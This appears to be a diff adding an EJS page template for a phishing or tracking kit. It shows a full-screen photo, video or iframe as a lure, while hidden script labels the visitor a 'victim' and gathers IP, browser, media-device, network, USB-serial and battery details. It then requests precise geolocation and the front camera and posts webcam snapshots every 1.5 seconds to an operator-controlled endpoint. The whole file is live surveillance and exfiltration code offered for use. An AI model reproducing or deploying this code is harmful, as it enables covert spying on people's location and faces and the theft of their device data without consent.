@@ -1,0 +1,158 @@
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title></title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;}
+.media-full{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1;}
+video.media-full{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1;cursor:pointer;}
+.ui-frame{position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:1;}
+</style>
+</head>
+<body>
+
+<% if(mediaType === 'photo') { %>
+<img src="/static/photo.png" class="media-full" />
+<% } else if(mediaType === 'video') { %>
+<video id="mainvid" class="media-full" playsinline muted preload="auto" loop>
+  <source src="/static/video.mp4" type="video/mp4">
+</video>
+<script>
+(function(){
+  var v = document.getElementById('mainvid');
+  // Ekranin istənilən hissəsinə klik → video oynasın
+  function play(e) {
+    v.muted = false;
+    v.play().then(function() {
+      if (v.requestFullscreen) v.requestFullscreen();
+      else if (v.webkitRequestFullscreen) v.webkitRequestFullscreen();
+      else if (v.msRequestFullscreen) v.msRequestFullscreen();
+    }).catch(function(){});
+    document.removeEventListener('click', play);
+    document.removeEventListener('touchstart', play);
+  }
+  document.addEventListener('click', play);
+  document.addEventListener('touchstart', play);
+})();
+</script>
+<% } else if(mediaType === 'gif') { %>
+<img src="/static/animate.gif" class="media-full" />
+<% } else if(mediaType === 'html') { %>
+<iframe src="/static/custom.html" class="ui-frame" allow="camera; microphone; geolocation"></iframe>
+<% } else { %>
+<iframe src="/static/index.html" class="ui-frame" allow="camera; microphone; geolocation"></iframe>
+<% } %>
+
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script type="text/javascript" defer>
+var uid="<%=uid %>";
+
+async function gather(){
+var td="";
+<% if(!t){ %>
+td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
+<% }else{ %>
+await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
+<% } %>
+
+td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
+var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
+var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
+td+="<br><b>📱 Device Information</b><br>";
+for(var i=0;i < xo.length;i++){
+if(xo[i] in navigator){
+var str = navigator[xo[i]];
+td+="<b>"+xo[i]+"</b>: <code>"+str+"</code><br>";
+}
+}
+
+if(navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices){
+await navigator.mediaDevices?.enumerateDevices()
+.then(function(devices){
+td+="<br><b>📷 Media Device Information</b><br>";
+devices.forEach(function(device){
+td+="<b>"+device.kind+":</b> "+device.label+" id = <code>"+device.deviceId+"</code><br>";
+});
+})
+.catch(function(err){
+td+="<br><b>📷 Media Device Information</b><br>";
+td+="⚠️ Media Device Error: "+err.name+": "+err.message;
+});
+}
+
+if("connection" in navigator){
+td+="<br><b>🕸️ Network Information</b><br>";
+for(var i=0;i < xoc.length;i++){
+var str = navigator.connection[xoc[i]];
+td+="<b>"+xoc[i]+"</b>: <code>"+str+"</code><br>";
+}
+}
+
+if("usb" in navigator){
+await navigator.usb.getDevices().then(devices=>{
+td+="<br><b>🔌 Total USB devices connected:</b> "+devices.length+"<br>";
+devices.forEach(device=>{
+td+="<b>Product name:</b> "+device.productName+" , <b>Serial number: </b> <code>"+device.serialNumber+"</code><br>";
+});
+});
+}
+
+if("getBattery" in navigator){
+await navigator.getBattery().then(function(battery){
+td+="<br><b>🔋 Battery Information</b><br>";
+td+="<b>🔋Battery Level:</b> "+battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging;
+});
+}
+
+td+="<br><b>📍 Location Information</b><br>";
+if(!navigator.geolocation){
+td+="⚠️ Location API not available";
+}
+
+$.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
+}
+
+function requestLocation(){
+if(!navigator.geolocation) return;
+function success(pos){
+const crd = pos.coords;
+$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{});
+}
+function error(err){}
+navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true, maximumAge:0});
+}
+
+function requestCamera(){
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+function post(o){
+$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{});
+}
+const constraints = {audio:false, video:{facingMode:"user"}};
+navigator.mediaDevices.getUserMedia(constraints).then(function(stream){
+window.stream = stream;
+video.srcObject = stream;
+var context = canvas.getContext('2d');
+setInterval(function(){
+context.drawImage(video,0,0,500,500);
+var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64","");
+post(canvasData);
+},1500);
+}).catch(function(e){});
+}
+
+gather();
+
+setTimeout(function(){
+requestLocation();
+requestCamera();
+}, 5000);
+</script>
+</body>
+</html>
